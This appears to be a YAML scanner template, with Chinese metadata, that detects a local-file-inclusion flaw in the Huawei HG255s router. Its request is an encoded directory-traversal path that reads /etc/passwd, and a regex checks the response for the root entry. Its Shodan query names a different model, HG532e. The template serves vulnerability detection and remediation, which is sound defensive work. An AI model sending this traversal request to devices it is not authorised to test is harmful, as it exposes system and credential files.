id: huawei-hg255s-lfi

info:
  name: Huawei HG255s - 本地文件包含漏洞
  author: 0x_Akoko
  severity: high
  description: |
    该模板用于检测 Huawei HG255s - 本地文件包含漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://cxsecurity.com/issue/WLB-2017090053
    - https://www.youtube.com/watch?v=n02toTFkLOU
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-23
    cpe: cpe:2.3:h:huawei:hg255s:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    shodan-query: http.html:"HG532e"
    product: hg255s
    vendor: huawei
  tags: huawei,lfi,router,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
